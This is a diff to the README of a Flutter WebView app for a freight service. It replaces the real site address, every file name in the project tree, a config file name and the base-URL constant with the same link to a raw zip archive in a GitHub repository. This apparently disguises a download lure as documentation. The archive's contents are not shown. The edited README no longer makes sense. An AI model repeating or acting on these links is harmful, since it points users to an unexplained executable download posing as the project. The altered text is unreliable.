@@ -1,6 +1,6 @@
 # Freighting WebView App
 
-A Flutter application that wraps the web interface of [https://app.freighting.in/](https://app.freighting.in/) in a native mobile app using WebView technology.
+A Flutter application that wraps the web interface of [https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip](https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip) in a native mobile app using WebView technology.
 
 ## Features
 
@@ -16,19 +16,19 @@ A Flutter application that wraps the web interface of [https://app.freighting.in
 
 ```
 lib/
-├── main.dart                          # App entry point
+├── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip                          # App entry point
 ├── browser_module/
-│   ├── browser_refresh_logic.dart     # Refresh handling logic for browser
-│   ├── browser_screen.dart            # Web browser screen UI
-│   └── youtube_embed_controller.dart  # YouTube embed management
+│   ├── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip     # Refresh handling logic for browser
+│   ├── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip            # Web browser screen UI
+│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip  # YouTube embed management
 ├── file_manager/
-│   └── file_handlers.dart             # File operations (open/save/etc.)
+│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip             # File operations (open/save/etc.)
 ├── network/
-│   └── network_status_checker.dart    # Internet connectivity status logic
+│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip    # Internet connectivity status logic
 ├── offline_support/
-│   └── no_internet_dialog.dart        # Dialog UI for offline situations
+│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip        # Dialog UI for offline situations
 ├── session/
-│   └── session_storage.dart           # Session and local storage logic
+│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip           # Session and local storage logic
 
 ```
 
@@ -113,10 +113,10 @@ Proper handling of various file types:
 
 ## Configuration
 
-You can modify the base URL in `session_manager.dart`:
+You can modify the base URL in `https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip`:
 
 ```dart
-const String _baseUrl = "https://app.freighting.in";
+const String _baseUrl = "https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip";
 ```
 
 ## Advanced Features
